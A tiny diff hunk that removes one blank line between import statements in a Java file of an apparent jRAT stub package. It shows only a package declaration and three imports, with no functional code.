@@ -1,7 +1,6 @@
 package io.jrat.stub.packets.incoming;
 
 import io.jrat.stub.Connection;
-
 import java.awt.Desktop;
 import java.io.File;
 
